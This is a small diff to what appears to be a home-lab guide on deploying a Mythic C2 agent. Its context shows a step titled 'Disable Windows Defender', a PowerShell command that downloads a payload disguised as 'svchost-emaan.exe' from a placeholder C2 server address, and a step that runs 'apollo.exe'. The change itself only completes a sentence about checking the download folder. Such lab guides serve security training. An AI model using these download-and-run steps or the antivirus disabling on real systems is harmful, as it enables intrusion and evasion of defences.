@@ -155,7 +155,8 @@ Disable Windows Defender:
     
     `Invoke-WebRequest -Uri http://<MYDFIR-MYTHIC-IP>:9999/svchost-emaan.exe -OutFile "C:\Users\Public\Downloads\svchost-emaan.exe"`
     
-    - Navigat
+    - Navigate into "C:\Users\Public\Downloads" to check if the file has been downloaded.
+    
 3. **Execute Payload**
     
     `.\apollo.exe`
